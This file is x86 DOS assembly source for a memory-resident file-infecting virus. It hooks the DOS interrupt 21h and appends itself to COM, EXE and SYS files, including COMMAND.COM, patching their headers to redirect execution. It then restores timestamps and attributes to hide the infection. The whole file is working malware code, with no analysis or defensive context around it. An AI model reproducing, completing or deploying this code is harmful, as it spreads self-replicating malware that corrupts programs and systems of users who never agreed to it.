CODE            Segment

COM             =       0
EXE             =       1
SYS             =       2


                Assume  CS:CODE,DS:Nothing
                Org     100h

start:          call    OfsChk
                call    VirChk
                jnc     Install
                lea     di,fbytes[si]
                cmp     byte ptr cs:[di-1],COM
                jne     ExitE
                Assume  DS:CODE
                mov     si,word ptr [di]
                mov     ds:[100h],si
                mov     si,word ptr [di+2]
                mov     ds:[102h],si
                mov     word ptr [di+14h],100h
                mov     word ptr [di+16h],ds
                jmp     short Exit
ExitE:          mov     si,ds
                add     si,10h
                Assume  DS:Nothing
                add     word ptr cs:[di+16h],si
                add     si,word ptr cs:[di+0Eh]
                mov     ss,si
Exit:           jmp     dword ptr cs:[di+14h]
Install:
                mov     di,ds:[002Ch]
        mov     cs:EnvSeg [si],di
        mov     ds,di
        xor si,si
lp0:            lodsb
                or      al,al
                jnz     lp0
                lodsb
                or      al,al
                jnz     lp0
                lodsw
        xor ax,1
        push    ax
        mov     cx,offset Buffer - offset Start
                add     si,offset start
                mov     di,100h
                push    cs
                pop     ds
        Assume  DS:CODE
        or  ax,ax
        jz  Avail
        mov ax,cs
        dec ax
        mov es,ax
        sub word ptr es:[3],(offset Buffer - offset Start) / 16 + 22h
        push    cs
        pop es
        mov ah,48h
        mov bx,(offset Buffer - offset Start) / 16 + 21h
        int 21h
        mov es,ax
        xor di,di
Avail:      pop ax
                push    es
        mov     bx,offset Cont
        push    bx
Moving:         db      0EAh
                dw      04F0h,0         ; JMP far ptr 0000:04F0


EnvSeg          dw      ?
CmdLine         dw      80h,?
FCB1            dw      5Ch,?
FCB2            dw      6Ch,?

Cont:           call    OfsChk
                xor     dx,dx
                mov     ds,dx
                Assume  DS:Nothing
                pushf
                cli
                mov     word ptr ds:[0084h],offset Int21h
                mov     word ptr ds:[0086h],cs
                popf
        mov     ax,cs
                mov     ds,ax
                Assume  DS:CODE
                cli
                mov     ss,ax
                mov     sp,((offset Buffer - offset Start) and 0FFFEh) + 300h
                sti
                mov     ah,4Ah
                mov     bx,(offset Buffer - offset Start) / 16 + 31h
                int     21h
                mov     CmdLine+2,cs
                mov     FCB1+2,cs
                mov     FCB2+2,cs
                mov     dx,si
                mov     bx,offset EnvSeg
                mov     ax,4B00h
                call    Int21
                mov     dx,(offset Buffer - offset Start) / 16 + 31h
                mov     ax,3100h
                call    Int21

ftype           db      COM
fbytes          db      4 dup (90h),18h dup (0A5h)
DTA_Save        dd      ?
InfCnt          db      0
DTA             db      2Ch dup (?)
Attr            =       21
Time            =       22
Date            =       24
fsize           =       26
fname           =       30
ComspecD        db      '*:\'
Comspec         db      'COMMAND.COM',0
FileSpecD       db      '*:'
FileSpec        db      13 dup ('*')

Int13           dd      ?
Saved13         dd      ?

SetInt13:       pushf
                cli
                mov     word ptr ds:[004Ch],dx
                mov     word ptr ds:[004Eh],es
                popf
                ret

VirusInfo:      mov     ax,0100
                push    cs
                pop     es
                iret

Exec:           mov     di,dx
                push    dx
                mov     ax,word ptr ds:[di]
                cmp     ah,':'
                je      DriveSet
                mov     ah,19h
                call    Int21
                add     al,'A'
DriveSet:       call    DriveChk
                pop     dx
                jc      End21h0
                mov     ah,4Eh
                mov     cx,00100111b
                call    Int21
                mov     ftype[si],COM
                call    Infect
End21h0:        jmp     End21h

Int21h:         cmp     ax,0A5FFh
                je      VirusInfo
Int21h1:
                push    ax
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    bp
                push    ds
                push    es
                pushf

                call    OfsChk
                push    ax
                mov     ah,2Fh
                push    bx
                call    Int21
                mov     word ptr DTA_Save[si],bx
                mov     word ptr DTA_Save[si+2],es
                pop     bx
                push    ds
                push    dx
                push    cs
                pop     ds
                lea     dx,DTA[si]
                mov     ah,1Ah
                call    Int21
                xor     dx,dx
                mov     ds,dx
                push    es
                les     dx,dword ptr ds:[004Ch]
                mov     word ptr Int13 [si],dx
                mov     word ptr Int13 [si+2],es
                les     dx,Saved13 [si]
                call    SetInt13
                pop     es
                pop     dx
                pop     ds
                pop     ax
                cmp     ax,4B00h
                jne     CheckOthers
                jmp     Exec
CheckOthers:    inc     InfCnt [si]
                cmp     ah,40h
                je      WriteFH
                push    cs
                pop     es
                lea     di,ScanTbl [si]
                mov     cx,12
                xchg    ah,al
        repne   scasb
                je      Match
                dec     InfCnt [si]
End21h:         lds     dx,DTA_Save [si]
                mov     ah,1Ah
                call    Int21
                xor     dx,dx
                mov     ds,dx
                les     dx,Int13 [si]
                call    SetInt13

                popf
                pop     es
                pop     ds
                pop     bp
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax

End21:          db      0eah            ; JMP Far ptr Saved21S:Saved21O
Saved21O        dw      ?
Saved21S        dw      ?

WriteFH:        mov     ax,4401h
                call    Int21
                test    dl,10000000b
                jz      End21h
                and     dl,00111111b
                mov     al,dl
                jmp     short Drive_OK_1

Int21:          pop     bp
                pushf
                push    cs
                push    bp
                jmp     End21

FSpec           db      '*:*****',0
ScanTbl         db      13h,15h,16h,17h,22h,28h,39h,3Ah,41h,56h,5Ah,5Bh
FCB_Fn          =       6

Match:          lea     cx,ScanTbl [FCB_Fn + si]
                cmp     di,cx
                mov     di,dx
                jb      Do_FCB_Fn
                mov     ax,word ptr ds:[di]
                cmp     ah,':'
                je      SetDrive
                jmp     short Current

Do_FCB_Fn:      mov     al,byte ptr ds:[di]
                add     di,7
                cmp     al,0FFh
                je      Do_FCB_Fn
                or      al,al
                jnz     Drive_OK
Current:        mov     ah,19h
                call    Int21
Drive_OK_1:     inc     al
Drive_OK:       add     al,'@'
SetDrive:       mov     FSpec [si],al
                mov     ComspecD [si],al
                mov     FileSpecD [si],al
                call    DriveChk
                jc      End_inf
                push    cs
                pop     ds
                assume  DS:CODE
                lea     dx,ComspecD[si]
                mov     ah,4Eh
                mov     cx,00100111b
                call    Int21
                jc      InfSYS
                call    Infect
                jnc     End_inf
InfSYS:         lea     dx,FSpec[si]
                mov     word ptr FSpec[si+3],'S.'
                mov     word ptr FSpec[si+5],'SY'
                mov     ftype[si],SYS
                call    InfectSome
                mov     word ptr FSpec[si+3],'E.'
                mov     word ptr FSpec[si+5],'EX'
                mov     ftype[si],EXE
                jnc     End_inf
                test    InfCnt[si],0Fh
                jnz     End_inf
                call    InfectSome
End_inf:        jmp     End21h


Save_ES         dw      ?
Save_BX         dw      ?

Strategy:       call    OfsChk
                mov     cs:Save_ES[si],es
                mov     cs:Save_BX[si],bx
                mov     di,word ptr cs:fbytes[si+06h]
                mov     word ptr cs:[06h],di
                jmp     di

BlockPtr        dw      ?,?

Init:           assume  DS:Nothing
                call    OfsChk
                mov     es,cs:Save_ES[si]
                mov     bx,cs:Save_BX[si]
                mov     di,word ptr fbytes[si+08h]
                mov     word ptr cs:[08h],di
                mov     BlockPtr [si],di
                mov     BlockPtr [si+2],cs
                push    es
                push    bx
                call    dword ptr BlockPtr [si]
                pop     bx
                pop     es
                mov     di,word ptr es:[bx+0Eh]
                or      di,di
                jz      EndInit
                call    VirChk
                jnc     Install1
EndInit:
                db      0cbh            ; RET Far


Install1:       push    es
                push    bx
                mov     es,word ptr es:[bx+10h]
                mov     dx,di
                cmp     di,64000
                jb      NoAdjust
                sub     di,1000h
                mov     ax,es
                add     ax,100h
                mov     es,ax
NoAdjust:
                add     di,offset Done - 100h
                push    es
                push    di
                mov     di,dx
                add     si,offset start
                push    cs
                pop     ds
                assume  DS:CODE
                cld
                mov     ax,si
                mov     cl,4
                shr     ax,cl
                mov     bx,di
                shr     bx,cl
                mov     cx,ds
                add     ax,cx
                mov     cx,es
                add     bx,cx
                mov     cx,offset Buffer - offset Start
                cmp     ax,bx
                ja      Transfer
                jb      FlipDir
                mov     ax,si
                and     ax,0Fh
                mov     bx,di
                and     bx,0Fh
                cmp     ax,bx
                ja      Transfer
                je      Done
FlipDir:        add     si,cx
                add     di,cx
                dec     si
                dec     di
                std
Transfer:
                jmp     Moving
Done:
                pop     bx
                pop     es
                add     dx,offset Buffer - offset Start + 512
                adc     word ptr es:[bx+10h],0
                mov     word ptr es:[bx+0Eh],dx
                call    OfsChk
                xor     dx,dx
                mov     ds,dx
                Assume  DS:Nothing
                pushf
                cli
                add     si,offset Int21h
                mov     word ptr ds:[0084h],si
                mov     word ptr ds:[0086h],cs
                popf
                db      0cbh            ; RET far

OfsChk:         call    Next
Next:           pop     si
                sub     si,offset Next
                push    es
                push    di
                xor     di,di
                mov     es,di
                mov     word ptr es:[4F0h],0A4F3h
                mov     byte ptr es:[4F2h],0CBh
                pop     di
                pop     es
                ret

Saved25         dd      ?
Saved26         dd      ?

VirChk:         push    ds
                push    es
                push    si
                push    di
                push    ax
                push    bx
                push    dx
                mov     ah,34h
                int     21h
                mov     dx,es
                xor     ax,ax
                mov     ds,ax
                push    cs
                pop     es
                mov     bx,si
                mov     si,84h
                lea     di,Saved21O [bx]
                call    IntSave
                jne     Caution
                add     si,12
                lea     di,Saved25 [bx]
                call    IntSave
                jne     Caution
                lea     di,Saved26 [bx]
                call    IntSave
                jne     Caution
                mov     dx,0070h
                mov     si,004Ch
                lea     di,Saved13 [bx]
                call    IntSave
                jne     Caution
                clc
                jmp     short EndVC
Caution:        stc
EndVC:          pop     dx
                pop     bx
                pop     ax
                pop     di
                pop     si
                pop     es
                pop     ds
                ret

IntSave:        movsw
                lodsw
                stosw
                cmp     ax,dx
                ret

InfectSome:     mov     ah,4Eh
                mov     cx,00100111b
ISLoop:         call    Int21
                jc      ISEnd
                push    si
                mov     cx,13
                lea     di,FileSpec [si]
                push    di
                add     si,offset DTA[fname]
                cld
        rep     movsb
                pop     dx
                pop     si
                call    Infect
                mov     ah,4Fh
                jc      ISLoop
ISEnd:          ret

DX_Save         dw      ?

ID310           =       0ADE9h
ID320           =       0DDE9h
Offs310_320     =       5460h
ID330           =       02DE9h
Offs330         =       54C0h

Infect:         push    ds
                pop     es
                mov     DX_Save[si],dx
                mov     ax,4301h
                xor     cx,cx
                call    Int21
                jc      ISEnd
                mov     ax,3D02h
                call    Int21
                jc      ISEnd
                mov     bx,ax
                mov     cx,1Ch
                mov     ah,3Fh
                lea     di,fbytes[si]
                mov     dx,di
                push    cs
                pop     ds
                assume  DS:CODE
                call    Int21
                jnc     ReadOK
                jmp     Close
ReadOK:         mov     ax,word ptr [di]
                cmp     byte ptr [di-1],SYS
                jne     EXECOM
                cmp     ax,0FFFFh
                jne     Close0
                cmp     word ptr [di+2],0FFFFh
                jne     Close0
                mov     ax,[di+4]
                test    al,10000000b
                jne     Close0
                mov     al,2
                xor     dx,dx
                jmp     short Go
EXECOM:         xor     dx,dx
                cmp     ax,5A4Dh
                mov     al,2
                je      TypeEXE
                cmp     byte ptr [di+3],0A5h
                je      Close0
                push    si
                push    di
                push    es
                push    cs
                pop     es
                assume  ES:CODE
                lea     di,Comspec[si]
                add     si,offset DTA[fname]
                mov     cx,11
        repe    cmpsb
                pop     es
                pop     di
                pop     si
                jne     NotComSp
                mov     cx,word ptr [di]
                xor     al,al
                mov     dx,Offs310_320
                cmp     cx,ID310
                je      ComSp
                cmp     cx,ID320
                je      ComSp
                mov     dx,Offs330
                cmp     cx,ID330
                je      ComSp
NotComSp:       mov     cx,word ptr DTA[fsize][si]
                cmp     cx,2048
                jb      Close0
                cmp     cx,64000
                ja      Close0
                xor     dx,dx
                mov     al,2
ComSp:          xor     cl,cl                           ; COM
                jmp     short SetType
TypeEXE:        cmp     word ptr [di+1Ah],0A5h
                jne     EXEFile
Close0:         stc
Close1:         jmp     Close
EXEFile:        mov     cl,EXE
SetType:        mov     byte ptr [di-1],cl
Go:             xor     cx,cx
                mov     ah,42h
                call    Int21
                jc      Close1
                push    ax
                mov     cx,16
                div     cx
                push    ax
                push    dx
                mov     cx,offset Buffer - offset Start
                lea     dx,start[si]
                mov     ah,40h
                call    Int21
                pop     dx
                pop     ax
                pop     cx
                jc      Close
                cmp     byte ptr [di-1],EXE
                jne     COMSYS
                sub     ax,word ptr [di+08h]
                mov     word ptr [di+14h],dx
                mov     word ptr [di+16h],ax
                add     ax,(offset Buffer - offset Start) / 16 + 1
                mov     word ptr [di+0Eh],ax
                mov     word ptr [di+1Ah],0A5h
                mov     ax,4202h
                xor     cx,cx
                xor     dx,dx
                call    Int21
                mov     cx,200h
                div     cx
                inc     ax
                mov     word ptr [di+2],dx
                mov     word ptr [di+4],ax
                jmp     short Write1A
COMSYS:         cmp     byte ptr [di-1],COM
                jne     TypeSYS
                sub     cx,3
                mov     byte ptr [di],0E9h
                mov     word ptr [di+1],cx
                mov     byte ptr [di+3],0A5h
                jmp     short Write1A
TypeSYS:        push    cx
                add     cx,offset Init - 100h
                mov     word ptr [di+8],cx
                pop     cx
                add     cx,offset Strategy - 100h
                mov     word ptr [di+6],cx
                or      byte ptr [di+4],10000000b
Write1A:        xor     cx,cx
                xor     dx,dx
                mov     ax,4200h
                call    Int21
                jc      Close
                mov     cx,1Ch
                mov     dx,di
                mov     ah,40h
                call    Int21
Close:          pushf
                mov     ax,5701h
                mov     cx,word ptr DTA[Time][si]
                mov     dx,word ptr DTA[Date][si]
                call    Int21
                mov     ah,3Eh
                call    Int21
                mov     ax,4301h
                mov     cl,byte ptr DTA[Attr][si]
                xor     ch,ch
                mov     dx,DX_Save[si]
                push    es
                pop     ds
                assume  DS:Nothing
                call    Int21
                popf
QuitE:          ret


DriveChk:       pushf
                push    si
                sub     al,'A'
                mov     cx,1
                xor     dx,dx
                push    ds
                push    cs
                pop     ds
                assume  DS:CODE
                lea     bx,Buffer [si]
                push    ax
                push    bx
                push    cx
                push    dx
                push    si
                call    Saved25 [si]
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                jc      EndDC
                push    ax
                push    bx
                push    cx
                push    dx
                push    si
                mov     bp,word ptr [bx+3]
                xor     word ptr [bx+3],0AA55h
                call    Saved26 [si]
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                jc      EndDC
                cmp     bp,word ptr [bx+3]
                stc
                je      EndDC
                mov     word ptr [bx+3],bp
                call    Saved26 [si]
EndDC:          pop     ds
                pop     si
                assume  DS:Nothing
                jc      ErrDC
                popf
                clc
                ret
ErrDC:          popf
                stc
                ret

Buffer          label   byte

CODE            EndS
                END     start
                